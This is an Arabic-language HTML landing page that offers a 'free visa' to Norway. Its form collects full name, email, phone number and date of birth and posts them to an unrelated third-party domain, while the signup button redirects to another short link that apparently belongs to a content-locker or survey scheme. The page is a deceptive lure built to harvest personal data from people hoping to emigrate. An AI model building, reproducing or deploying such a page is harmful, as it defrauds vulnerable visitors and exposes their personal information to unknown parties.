<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التسجيل للحصول على فيزا مجانية للنرويج</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(to right, #6db3f2, #1e69d2);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
            text-align: center;
        }
        .container {
            background-color: rgba(255, 255, 255, 0.9);
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
            width: 350px;
        }
        h1 {
            margin-bottom: 10px;
            font-size: 24px;
            color: #333;
        }
        p {
            margin-bottom: 20px;
            font-size: 16px;
            color: #555;
        }
        input[type="text"], input[type="email"], input[type="phone"], input[type="date"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }
        button {
            background-color: #28a745;
            color: #fff;
            border: none;
            padding: 12px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #218838;
        }
        .footer {
            margin-top: 15px;
            font-size: 14px;
            color: #777;
        }
        .highlight {
            color: #28a745;
            font-weight: bold;
        }
        img {
            max-width: 100%;
            border-radius: 10px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://i.ibb.co/yXdd9zY/Picsart-24-09-25-02-17-08-590.png alt="Beautiful Norway" />
        <h1>انضم إلينا الآن!</h1>
        <p>هل ترغب في زيارة <span class="highlight">العالم</span> مجانًا؟ املأ النموذج أدناه للحصول على <span class="highlight">فيزا مجانية</span>!</p>
        <form action="https://verifysuper.com/sl/42k8r" method="POST">
            <input type="text" name="fullname" placeholder="الاسم الكامل" required>
            <input type="email" name="email" placeholder="البريد الإلكتروني" required>
            <input type="text" name="phone" placeholder="رقم الهاتف" required>
            <input type="date" name="dob" placeholder="تاريخ الميلاد" required>
            <a href="https://locked2.com/sl/7w1eq">
              <button type="button">سجل الآن</button>
            </a>
            
        </form>
        <div class="footer">
            <p>تابعنا لمزيد من الفرص!</p>
        </div>
    </div>

</body>
</html>
